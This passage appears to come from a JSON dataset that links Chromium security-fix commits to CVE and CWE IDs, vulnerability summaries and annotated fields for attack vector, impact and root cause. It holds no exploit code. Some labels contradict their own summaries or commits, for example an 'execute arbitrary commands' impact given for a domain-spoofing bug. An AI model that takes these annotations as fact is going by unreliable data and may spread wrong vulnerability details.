allowed a remote attacker to perform domain spoofing in permission dialogs via IDN homographs in a crafted Chrome Extension.","commit_message_1":"ensure idn domain are in punycode format in extension host permission today in extension dialog and bubble , idn domain in host permission are not displayed in punycode format","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted chrome extension","Impact":"perform domain spoofing in permission dialogs","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"84ca1ee18bbc32f3cb035d071e8271e064dfd4d7","cve_id":"CVE-2017-15395","cwe_id":"CWE-416","commit_message":"Convert MediaTrackConstraints to a ScriptValue\n\nIDLDictionaries such as MediaTrackConstraints should not be stored on\nthe heap which would happen when binding one as a parameter to a\ncallback. This change converts the object to a ScriptValue ahead of\ntime. This is fine because the value will be passed to a\nScriptPromiseResolver that will converted it to a V8 value if it\nisn't already.\n\nBug: 759457\nChange-Id: I3009a0f7711cc264aeaae07a36c18a6db8c915c8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/701358\nReviewed-by: Kentaro Hara <haraken@chromium.org>\nCommit-Queue: Reilly Grant <reillyg@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#507177}","summary":"A use after free in Blink in Google Chrome prior to 62.0.3202.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page, aka an ImageCapture NULL pointer dereference.","commit_message_1":"convert mediatrackconstraints to a scriptvalue idldictionaries such a mediatrackconstraints should not be stored on the heap which would happen when binding one a a parameter to a callback","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page , aka an imagecapture pointer dereference","Impact":"potentially exploit heap corruption","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"761d65ebcac0cdb730fd27b87e207201ac38e3b4","cve_id":"CVE-2019-5828","cwe_id":"CWE-416","commit_message":"[Payment Handler] Don't wait for response from closed payment app.\n\nBefore this patch, tapping the back button on top of the payment handler\nwindow on desktop would not affect the |response_helper_|, which would\ncontinue waiting for a response from the payment app. The service worker\nof the closed payment app could timeout after 5 minutes and invoke the\n|response_helper_|. Depending on what else the user did afterwards, in\nthe best case scenario, the payment sheet would display a \"Transaction\nfailed\" error message. In the worst case scenario, the\n|response_helper_| would be used after free.\n\nThis patch clears the |response_helper_| in the PaymentRequestState and\nin the ServiceWorkerPaymentInstrument after the payment app is closed.\n\nAfter this patch, the cancelled payment app does not show \"Transaction\nfailed\" and does not use memory after it was freed.\n\nBug: 956597\nChange-Id: I64134b911a4f8c154cb56d537a8243a68a806394\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1588682\nReviewed-by: anthonyvd <anthonyvd@chromium.org>\nCommit-Queue: Rouslan Solomakhin <rouslan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#654995}","summary":"Object lifecycle issue in ServiceWorker in Google Chrome prior to 75.0.3770.80 allowed a remote attacker to potentially perform out of bounds memory access via a crafted HTML page.","commit_message_1":"do n't wait for response from closed payment app","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially perform out of bounds memory access","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"17368442aec0f48859a3561ae5e441175c7041ba","cve_id":"CVE-2019-5829","cwe_id":"CWE-416","commit_message":"Early return if a download Id is already used when creating a download\n\nThis is protect against download Id overflow and use-after-free\nissue.\n\nBUG=958533\n\nChange-Id: I2c183493cb09106686df9822b3987bfb95bcf720\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1591485\nReviewed-by: Xing Liu <xingliu@chromium.org>\nCommit-Queue: Min Qin <qinmin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#656910}","summary":"Integer overflow in download manager in Google Chrome prior to 75.0.3770.80 allowed a remote attacker to potentially perform out of bounds memory access via a crafted HTML page.","commit_message_1":"early return if a download id is already used when creating a download this is protect against download id overflow and use-after-free issue","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially perform out of bounds memory access","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"08cc019f3f8c86d24330b4e3770bc2674000937c","cve_id":"CVE-2019-5832","cwe_id":"CWE-284","commit_message":"[XHR] Use response tainting to calculate CORS-exposed header-name list\n\nXHR uses the same-originness of the request origin and the destination\nURL to calculate the CORS-exposed header-name list, which leads to\nwrong results with redirects. Use response tainting as specced.\n\nBug: 959390\nChange-Id: Iec448dfe7d2b47d00f0f471391eb7918a1fe7bc4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1598949\nReviewed-by: Takashi Toyoshima <toyoshim@chromium.org>\nCommit-Queue: Yutaka Hirano <yhirano@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#657626}","summary":"Insufficient policy enforcement in XMLHttpRequest in Google Chrome prior to 75.0.3770.80 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"use response tainting to calculate cors-exposed header-name list xhr us the same-originness of the request origin and the destination url to calculate the cors-exposed header-name list , which lead to wrong result with redirects","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by incorrect CORS handling","Attack Type":"remote attacker"},{"commit_id":"04aaacb936a08d70862d6d9d7e8354721ae46be8","cve_id":"CVE-2019-5837","cwe_id":"CWE-200","commit_message":"Reland \"AppCache: Add padding to cross-origin responses.\"\n\nThis is a reland of 85b389caa7d725cdd31f59e9a2b79ff54804b7b7\n\nInitialized CacheRecord::padding_size to 0.\n\nOriginal change's description:\n> AppCache: Add padding to cross-origin responses.\n>\n> Bug: 918293\n> Change-Id: I4f16640f06feac009d6bbbb624951da6d2669f6c\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1488059\n> Commit-Queue: Staphany Park <staphany@chromium.org>\n> Reviewed-by: Victor Costan <pwnall@chromium.org>\n> Reviewed-by: Marijn Kruisselbrink <mek@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#644624}\n\nBug: 918293\nChange-Id: Ie1d3f99c7e8a854d33255a4d66243da2ce16441c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1539906\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCommit-Queue: Staphany Park <staphany@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#644719}","summary":"Resource size information leakage in Blink in Google Chrome prior to 75.0.3770.80 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"add padding to cross-origin response","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by a cross-origin resources size disclosure","Attack Type":"remote attacker"},{"commit_id":"0660e08731fd42076d7242068e9eaed1482b14d5","cve_id":"CVE-2019-5838","cwe_id":"CWE-20","commit_message":"Call CanCaptureVisiblePage in page capture API.\n\nCurrently the pageCapture permission allows access\nto arbitrary local files and chrome:\/\/ pages which\ncan be a security concern. In order to address this,\nthe page capture API needs to be changed similar to\nthe captureVisibleTab API. The API will now only allow\nextensions to capture otherwise-restricted URLs if the\nuser has granted activeTab. In addition, file:\/\/ URLs are\nonly capturable with the \"Allow on file URLs\" option enabled.\n\nBug: 893087\n\nChange-Id: I6d6225a3efb70fc033e2e1c031c633869afac624\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1330689\nCommit-Queue: Bettina Dea <bdea@chromium.org>\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Varun Khaneja <vakh@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#615248}","summary":"Insufficient policy enforcement in extensions API in Google Chrome prior to 75.0.3770.80 allowed an attacker who convinced a user to install a malicious extension to bypass restrictions on file URIs via a crafted Chrome Extension.","commit_message_1":"call cancapturevisiblepage in page capture api","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to bypass restrictions on file uris","Root Cause":"caused by overly permissive tab access","Attack Type":"remote attacker"},{"commit_id":"19b1e5e4e1914b5b7464062ec300b817d2bac53d","cve_id":"CVE-2019-5839","cwe_id":"CWE-20","commit_message":"[url] Make path URL parsing more lax\n\nParsing the path component of a non-special URL like javascript or data\nshould not fail for invalid URL characters like \\uFFFF. See this bit\nin the spec:\nhttps:\/\/url.spec.whatwg.org\/#cannot-be-a-base-url-path-state\n\nNote: some failing WPTs are added which are because url parsing\nreplaces invalid characters (e.g. \\uFFFF) with the replacement char\n\\uFFFD, when that isn't in the spec.\n\nBug: 925614\nChange-Id: I450495bfdfa68dc70334ebed16a3ecc0d5737e88\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1551917\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Charlie Harrison <csharrison@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#648155}","summary":"Excessive data validation in URL parser in Google Chrome prior to 75.0.3770.80 allowed a remote attacker who convinced a user to input a URL to bypass website URL validation via a crafted URL.","commit_message_1":"make path url parsing more lax parsing the path component of a non-special url like javascript or data should not fail for invalid url character like \\uffff","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted url","Impact":"input a url to bypass website url validation","Root Cause":"caused by incorrect handling of certain code points","Attack Type":"remote attacker"},{"commit_id":"cfb022640b5eec337b06f88a485487dc92ca1ac1","cve_id":"CVE-2019-5824","cwe_id":"CWE-119","commit_message":"[MediaStream] Pass request ID parameters in the right order for OpenDevice()\n\nPrior to this CL, requester_id and page_request_id parameters were\npassed in incorrect order from MediaStreamDispatcherHost to\nMediaStreamManager for the OpenDevice() operation, which could lead to\nerrors.\n\nBug: 948564\nChange-Id: Iadcf3fe26adaac50564102138ce212269cf32d62\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1569113\nReviewed-by: Marina Ciocea <marinaciocea@chromium.org>\nCommit-Queue: Guido Urdaneta <guidou@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#651255}","summary":"Parameter passing error in media in Google Chrome prior to 74.0.3729.131 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"pas request id parameter in the right order for opendevice ( ) prior to this cl , requester_id and page_request_id parameter were passed in incorrect order from mediastreamdispatcherhost to mediastreammanager for the opendevice ( ) operation , which could lead to error","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a parameter passing error","Attack Type":"remote attacker"},{"commit_id":"eaf2e8bce3855d362e53034bd83f0e3aff8714e4","cve_id":"CVE-2019-5826","cwe_id":"CWE-416","commit_message":"[IndexedDB] Fixed force close during pending connection open\n\nDuring a force close of the database, the connections to that database\nare iterated and force closed. The iteration method was not safe to\nmodification, and if there was a pending connection waiting to open,\nthat request would execute once all the other connections were\ndestroyed and create a new connection.\n\nThis change changes the iteration method to account for new connections\nthat are added during the iteration.\n\nR=cmp@chromium.org\n\nBug: 941746\nChange-Id: If1b3137237dc2920ad369d6ac99c963ed9c57d0c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1522330\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nReviewed-by: Chase Phillips <cmp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#640604}","summary":"Use after free in IndexedDB in Google Chrome prior to 73.0.3683.86 allowed a remote attacker who had compromised the renderer process to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fixed force close during pending connection open during a force close of the database , the connection to that database are iterated and force closed","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted HTML page","Impact":"exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"4a3482693491ac6bb3dd27d591efa3de1d1f1fcf","cve_id":"CVE-2019-5809","cwe_id":"CWE-416","commit_message":"Fix a crash on FileChooserImpl\n\nIf a renderer process is compromised, and it calls both of\nFileChooserImpl::OpenFileChooser() and EnumerateChosenDirectory() via\nMojo, the browser process could crash because ResetOwner() for\nthe first FileChooserImpl::proxy_ instance was not called.  We\nshould check nullness of proxy_ before updating it.\n\nBug: 941008\nChange-Id: Ie0c1895ec46ce78d40594b543e49e43b420af675\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1520509\nReviewed-by: Avi Drissman <avi@chromium.org>\nCommit-Queue: Kent Tamura <tkent@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#640580}","summary":"Use after free in file chooser in Google Chrome prior to 74.0.3729.108 allowed a remote attacker who had compromised the renderer process to perform privilege escalation via a crafted HTML page.","commit_message_1":"fix a crash on filechooserimpl if a renderer process is compromised , and it call both of filechooserimpl : :openfilechooser ( ) and enumeratechosendirectory ( ) via mojo , the browser process could crash because resetowner ( ) for the first filechooserimpl : :proxy_ instance wa not called","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"perform privilege escalation","Root Cause":"caused by a use-after-free vulnerability","Attack Type":"remote attacker"},{"commit_id":"929f77d4173022a731ae91218ce6894d20f87f35","cve_id":"CVE-2019-5818","cwe_id":"CWE-200","commit_message":"Cleanup media BitReader ReadBits() calls\n\nInitialize temporary values, check return values.\nSmall tweaks to solution proposed by adtolbar@microsoft.com.\n\nBug: 929962\nChange-Id: Iaa7da7534174882d040ec7e4c353ba5cd0da5735\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1481085\nCommit-Queue: Chrome Cunningham <chcunningham@chromium.org>\nReviewed-by: Dan Sanders <sandersd@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#634889}","summary":"Uninitialized data in media in Google Chrome prior to 74.0.3729.108 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted video file.","commit_message_1":"cleanup medium bitreader readbits ( ) call initialize temporary value , check return value","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted video file","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by uninitialized value","Attack Type":"remote attacker"},{"commit_id":"2f81d000fdb5331121cba7ff81dfaaec25b520a5","cve_id":"CVE-2019-5822","cwe_id":"CWE-284","commit_message":"When turning a download into a navigation, navigate the right frame\n\nCode changes from Nate Chapin <japhet@chromium.org>\n\nBug: 926105\nChange-Id: I098599394e6ebe7d2fce5af838014297a337d294\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1454962\nReviewed-by: Camille Lamy <clamy@chromium.org>\nCommit-Queue: Jochen Eisinger <jochen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#629547}","summary":"Inappropriate implementation in Blink in Google Chrome prior to 74.0.3729.108 allowed a remote attacker to bypass same origin policy via a crafted HTML page.","commit_message_1":"when turning a download into a navigation , navigate the right frame","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted html page","Impact":"bypass same origin policy","Root Cause":"caused by a CORS bypass","Attack Type":"remote attacker"},{"commit_id":"e8bf23bbbc3976d6a3418a7298a39bbf35c7beb3","cve_id":"CVE-2019-5823","cwe_id":"CWE-601","commit_message":"Prevent WindowClient.navigate() from cancelling a browser-initiated navigation.\n\nOtherwise, a service worker can prevent you from navigating where you\nwant to go via the omnibox.\n\nNote: this is similar to WebContentsImpl::OnGoToEntryAtOffset() for\nrenderer-initiated history navigations.\n\nBug: 930154\nChange-Id: I3a687ccc8ba4420d2369adb24f63c2702bdeeff1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1477454\nCommit-Queue: Matt Falkenhagen <falken@chromium.org>\nCommit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>\nReviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>\nAuto-Submit: Matt Falkenhagen <falken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#633231}","summary":"Insufficient policy enforcement in service workers in Google Chrome prior to 74.0.3729.108 allowed a remote attacker to bypass navigation restrictions via a crafted HTML page.","commit_message_1":"prevent <file> ( ) from cancelling a browser-initiated navigation","Vulnerability Type":"Open Redirect","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"gain unauthorized access to the system","Root Cause":"caused by forced navigation from service worker","Attack Type":"remote attacker"},{"commit_id":"6a7063ae61cf031630b48bdcdb09863ffc199962","cve_id":"CVE-2019-5787","cwe_id":"CWE-416","commit_message":"Clean up CanvasResourceDispatcher on finalizer\n\nWe may have pending mojo messages after GC, so we want to drop the\ndispatcher as soon as possible.\n\nBug: 929757,913964\nChange-Id: I5789bcbb55aada4a74c67a28758f07686f8911c0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1489175\nReviewed-by: Ken Rockot <rockot@google.com>\nCommit-Queue: Ken Rockot <rockot@google.com>\nCommit-Queue: Fernando Serboncini <fserb@chromium.org>\nAuto-Submit: Fernando Serboncini <fserb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#635833}","summary":"Use-after-garbage-collection in Blink in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"clean up canvasresourcedispatcher on finalizer we may have pending mojo message after gc , so we want to drop the dispatcher a soon a possible","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"b38064dbb21aaf32151073dcb7d594b240c68f73","cve_id":"CVE-2019-5788","cwe_id":"CWE-190","commit_message":"[FileSystem] Harden against overflows of OperationID a bit better.\n\nRather than having a UAF when OperationID overflows instead overwrite\nthe old operation with the new one. Can still cause weirdness, but at\nleast won't result in UAF. Also update OperationID to uint64_t to\nmake sure we don't overflow to begin with.\n\nBug: 925864\nChange-Id: Ifdf3fa0935ab5ea8802d91bba39601f02b0dbdc9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1441498\nCommit-Queue: Marijn Kruisselbrink <mek@chromium.org>\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#627115}","summary":"An integer overflow that leads to a use-after-free in Blink Storage in Google Chrome on Linux prior to 73.0.3683.75 allowed a remote attacker who had compromised the renderer process to execute arbitrary code via a crafted HTML page.","commit_message_1":"harden against overflow of operationid a bit better","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"c3fe3dc27d10a53a54bb5231b6fce07318af952f","cve_id":"CVE-2019-5789","cwe_id":"CWE-190","commit_message":"Web MIDI: Make TaskService and MidiManagerWin integer-overflow-proof\n\nTaskService and MidiManagerWin uses int to identify the instance,\nbut this change makes it int64_t and improve them to fail gracefully\nwithout shutting-down the browser due to CHECK failures.\n\nFor practical use, the original int is enough and it's impossible\nto overflow the instance ID unless attackers success to run their code\nfor several months on an occupied active processor.\n\nBug: 921581\nChange-Id: I62c7cd737ab3d3969e372bb394e60381473eaa58\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1449483\nReviewed-by: Yutaka Hirano <yhirano@chromium.org>\nCommit-Queue: Takashi Toyoshima <toyoshim@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#631175}","summary":"An integer overflow that leads to a use-after-free in WebMIDI in Google Chrome on Windows prior to 73.0.3683.75 allowed a remote attacker who had compromised the renderer process to execute arbitrary code via a crafted HTML page.","commit_message_1":"make taskservice and midimanagerwin integer-overflow-proof taskservice and midimanagerwin us int to identify the instance , but this change make it int64_t and improve them to fail gracefully without shutting-down the browser due to check failure","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"88fcb3a6899d77b64195423333ad81a00803f997","cve_id":"CVE-2019-5790","cwe_id":"CWE-190","commit_message":"Move user activation check to RemoteFrame::Navigate's callers.\n\nCurrently RemoteFrame::Navigate is the user of\nFrame::HasTransientUserActivation that passes a RemoteFrame*, and\nit seems wrong because the user activation (user gesture) needed by\nthe navigation should belong to the LocalFrame that initiated the\nnavigation.\n\nFollow-up CLs after this one will update UserActivation code in\nFrame to take a LocalFrame* instead of a Frame*, and get rid of\nredundant IPCs.\n\nBug: 811414\nChange-Id: I771c1694043edb54374a44213d16715d9c7da704\nReviewed-on: https:\/\/chromium-review.googlesource.com\/914736\nCommit-Queue: Mustaq Ahmed <mustaq@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#536728}","summary":"An integer overflow leading to an incorrect capacity of a buffer in JavaScript in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.","commit_message_1":"move user activation check to remoteframe : :navigate 's caller","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code inside a sandbox","Root Cause":"caused by improper bounds checking by V8","Attack Type":"remote attacker"},{"commit_id":"227851d714bdc081de4c7e81669420380fa6c000","cve_id":"CVE-2019-5792","cwe_id":"CWE-190","commit_message":"arc: add test for blocking incognito windows in screenshot\n\nBUG=778852\nTEST=ArcVoiceInteractionFrameworkServiceUnittest.\n  CapturingScreenshotBlocksIncognitoWindows\n\nChange-Id: I0bfa5a486759783d7c8926a309c6b5da9b02dcc6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/914983\nCommit-Queue: Muyuan Li <muyuanli@chromium.org>\nReviewed-by: Luis Hector Chavez <lhchavez@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#536438}","summary":"Integer overflow in PDFium in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to potentially perform out of bounds memory access via a crafted PDF file.","commit_message_1":"add test for blocking incognito window in screenshot bug=<number> capturingscreenshotblocksincognitowindows","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted pdf file","Impact":"potentially perform out of bounds memory access","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"56b512399a5c2221ba4812f5170f3f8dc352cd74","cve_id":"CVE-2019-5794","cwe_id":"CWE-20","commit_message":"Show an error page if a URL redirects to a javascript: URL.\n\nBUG=935175\n\nChange-Id: Id4a9198d5dff823bc3d324b9de9bff2ee86dc499\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1488152\nCommit-Queue: Charlie Reis <creis@chromium.org>\nReviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#635848}","summary":"Incorrect handling of cancelled requests in Navigation in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to perform domain spoofing via a crafted HTML page.","commit_message_1":"show an error page if a url redirects to a javascript : url","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing","Root Cause":"Incorrect handling of cancelled requests","Attack Type":"remote attacker"},{"commit_id":"5bb223676defeba9c44a5ce42460c86e24561e73","cve_id":"CVE-2019-5796","cwe_id":"CWE-362","commit_message":"[GuestView] - Introduce MimeHandlerViewAttachHelper\n\nThis CL is for the most part a mechanical change which extracts almost\nall the frame-based MimeHandlerView code out of\nExtensionsGuestViewMessageFilter. This change both removes the current\nclutter form EGVMF as well as fixesa race introduced when the\nframe-based logic was added to EGVMF. The reason for the race was that\nEGVMF is destroyed on IO thread but all the access to it (for\nframe-based MHV) are from UI.\n\nTBR=avi@chromium.org,lazyboy@chromium.org\n\nBug: 659750, 896679, 911161, 918861\nChange-Id: I6474b870e4d56daa68be03637bb633665d9f9dda\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1401451\nCommit-Queue: Ehsan Karamad <ekaramad@chromium.org>\nReviewed-by: James MacLean <wjmaclean@chromium.org>\nReviewed-by: Ehsan Karamad <ekaramad@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#621155}","summary":"Data race in extensions guest view in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"- introduce mimehandlerviewattachhelper this cl is for the most part a mechanical change which extract almost all the frame-based mimehandlerview code out of extensionsguestviewmessagefilter","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"ba169c14aa9cc2efd708a878ae21ff34f3898fe0","cve_id":"CVE-2019-5797","cwe_id":"CWE-415","commit_message":"Fixing BadMessageCallback usage by SessionStorage\n\nTBR: jam@chromium.org\nBug: 916523\nChange-Id: I027cc818cfba917906844ad2ec0edd7fa4761bd1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1401604\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nReviewed-by: Marijn Kruisselbrink <mek@chromium.org>\nReviewed-by: Ken Rockot <rockot@google.com>\nCr-Commit-Position: refs\/heads\/master@{#621772}","summary":"Double free in DOMStorage in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fixing badmessagecallback usage by sessionstorage","Vulnerability Type":"double free","Attack Vector":"via a crafted HTML page","Impact":"exploit heap corruption","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"108147dfd1ea159fd3632ef92ccc4ab8952980c7","cve_id":"CVE-2019-5799","cwe_id":"CWE-20","commit_message":"Inherit the navigation initiator when navigating instead of the parent\/opener\n\nSpec PR: https:\/\/github.com\/w3c\/webappsec-csp\/pull\/358\n\nBug: 905301, 894228, 836148\nChange-Id: I43ada2266d42d1cd56dbe3c6dd89d115e878a83a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1314633\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#610850}","summary":"Incorrect inheritance of a new document's policy in Content Security Policy in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"inherit the navigation initiator when navigating instead of the parent\/opener","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass content security policy","Root Cause":"caused by CSP bypass with blob URL","Attack Type":"remote attacker"},{"commit_id":"0e3b0c22a5c596bdc24a391b3f02952c1c3e4f1b","cve_id":"CVE-2019-5803","cwe_id":"CWE-20","commit_message":"Check the source browsing context's CSP in Location::SetLocation prior to dispatching a navigation to a `javascript:` URL.\n\nMakes `javascript:` navigations via window.location.href compliant with\nhttps:\/\/html.spec.whatwg.org\/#navigate, which states that the source\nbrowsing context must be checked (rather than the current browsing\ncontext).\n\nBug: 909865\nChange-Id: Id6aef6eef56865e164816c67eb9fe07ea1cb1b4e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1359823\nReviewed-by: Andy Paicu <andypaicu@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Andrew Comminos <acomminos@fb.com>\nCr-Commit-Position: refs\/heads\/master@{#614451}","summary":"Insufficient policy enforcement in Content Security Policy in Google Chrome prior to 73.0.3683.75 allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"check the source browsing context 's csp in location : :setlocation prior to dispatching a navigation to a ` javascript : ` url","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass content security policy","Root Cause":"caused by CSP bypass with Javascript URLs'","Attack Type":"remote attacker"},{"commit_id":"08965161257ab9aeef9a3548c1cd1a44525dc562","cve_id":"CVE-2019-5804","cwe_id":"CWE-77","commit_message":"Ignore switches following \"--\" when parsing a command line.\n\nBUG=933004\nR=wfh@chromium.org\n\nChange-Id: I911be4cbfc38a4d41dec85d85f7fe0f50ddca392\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1481210\nAuto-Submit: Greg Thompson <grt@chromium.org>\nCommit-Queue: Julian Pastarmov <pastarmovj@chromium.org>\nReviewed-by: Julian Pastarmov <pastarmovj@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#634604}","summary":"Incorrect command line processing in Chrome in Google Chrome prior to 73.0.3683.75 allowed a local attacker to perform domain spoofing via a crafted domain name.","commit_message_1":"ignore switch following `` -- '' when parsing a command line","Vulnerability Type":"Command Injection","Attack Vector":"via a crafted domain name .","Impact":"execute arbitrary commands","Root Cause":"caused by a command line command injection on Windows","Attack Type":"local attacker"},{"commit_id":"ba9748e78ec7e9c0d594e7edf7b2c07ea2a90449","cve_id":"CVE-2019-5786","cwe_id":"CWE-416","commit_message":"FileReader: Make a copy of the ArrayBuffer when returning partial results.\n\nThis is to avoid accidentally ending up with multiple references to the\nsame underlying ArrayBuffer. The extra performance overhead of this is\nminimal as usage of partial results is very rare anyway (as can be seen\non https:\/\/www.chromestatus.com\/metrics\/feature\/timeline\/popularity\/2158).\n\nBug: 936448\nChange-Id: Icd1081adc1c889829fe7fa4af9cf4440097e8854\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1492873\nCommit-Queue: Marijn Kruisselbrink <mek@chromium.org>\nReviewed-by: Adam Klein <adamk@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#636251}","summary":"Object lifetime issue in Blink in Google Chrome prior to 72.0.3626.121 allowed a remote attacker to potentially perform out of bounds memory access via a crafted HTML page.","commit_message_1":"make a copy of the arraybuffer when returning partial result","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially perform out of bounds memory access","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"fd2335678e96c34d14f4b20f0d9613dfbd1ccdb4","cve_id":"CVE-2019-5754","cwe_id":"CWE-310","commit_message":"Fix a bug in network_session_configurator.cc in which support for HTTPS URLS in QUIC proxies was always set to false.\n\nBUG=914497\n\nChange-Id: I56ad16088168302598bb448553ba32795eee3756\nReviewed-on: 